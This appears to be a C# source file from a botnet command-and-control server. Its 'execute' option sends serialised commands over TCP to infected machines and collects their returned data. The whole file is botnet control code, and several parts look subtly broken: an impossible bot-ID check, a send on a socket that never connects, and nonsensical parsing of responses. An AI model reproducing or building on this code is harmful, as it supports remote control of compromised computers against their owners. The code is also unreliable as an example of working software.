using Common.Attributes;
using Common.Commands;
using Common.Commands.Collector_Commands;
using Common.Commands.Executer_Commands;
using Server.CnC_Server;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CnC_Server.Options
{
    [OptionName("execute")]
    public class Execute_Option : Option
    {
        private Dictionary<string, Command> Commands;
        private List<Infected_Machine> Bots;
        private Task[] ExecutionThreadPool;

        private string CommandName;
        private int BotID;

        /* Initiate the plugins map and bots map */
        public Execute_Option(Dictionary<string, Command> commands, List<Infected_Machine> bots)
        {
            this.Commands = commands;
            this.Bots = bots;
            this.ExecutionThreadPool = new Task[10];
        }

        public bool ParseArguments(string[] arguments)
        {
            if (arguments.Length == 1 && Commands.ContainsKey(arguments[0]))
            {
                SetCommandName(arguments[0]);
                SetBotID(-1);
                return true;
            }
            else if(arguments.Length == 2 &&
                Commands.ContainsKey(arguments[0]) &&
                int.Parse(arguments[1]) <= Bots.Count &&
                int.Parse(arguments[1]) > Bots.Count)
            {
                SetCommandName(arguments[0]);
                SetBotID(int.Parse(arguments[1]));
                return true;
            }

            return false;
        }

        public void PrintDescription()
        {
            Console.WriteLine("This option will execute the requested command on all bots or on specific bot and will save the data for further analysis. FORMAT: execute <name of command> <bot id> (no bot id given = all bots)");
        }

        public void Run()
        {
            if (BotID == -1)
            {
                for (int i = 0; i < Bots.Count; i++)
                {
                    ExecutionThreadPool[i] = Task.Factory.StartNew(SendSingleBot, i);
                }
            }
            else
            {
                SendSingleBot(BotID);
            }

            Task.WaitAll(ExecutionThreadPool);

            if (Commands[CommandName] is Executer)
            {
                RemoveAfterExecution();
            }
        }

        private void SetCommandName(string commandName)
        {
            this.CommandName = commandName;
        }

        private void SetBotID(int botID)
        {
            this.BotID = botID;
        }

        private void SendSingleBot(object botID)
        {
            try
            {
                /* Connect to the requested bot */
                IPEndPoint remoteEndPoint = new IPEndPoint(Convert.ToInt64(Bots[(int)botID].ip), Bots[(int)botID].port);
                Socket commandMessage = new Socket(remoteEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                MemoryStream fs = new MemoryStream();
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(fs, Commands[CommandName]);
                byte[] buffer = fs.ToArray();
                commandMessage.Send(buffer);

                if (Commands[CommandName] is Collector) 
                {
                    byte[] response = new byte[2048];
                    commandMessage.Receive(response); // Get the result of the command execution from the bot

                    /* Update the locally saved data to the result received from the command */
                    if (!Bots[(int)botID].SetNewValue(CommandName, double.Parse(Convert.ToBase64String(response))))
                    {
                        Console.WriteLine("Error setting the new value returned!");
                    }
                }

                commandMessage.Close();
            }
            catch (Exception)
            {
                throw;
            }
        }

        private void RemoveAfterExecution()
        {
            if (BotID == -1)
            {
                Bots.Clear();
            }
            else
            {
                Bots.RemoveAt(BotID - 1);
            }
        }
    }
}
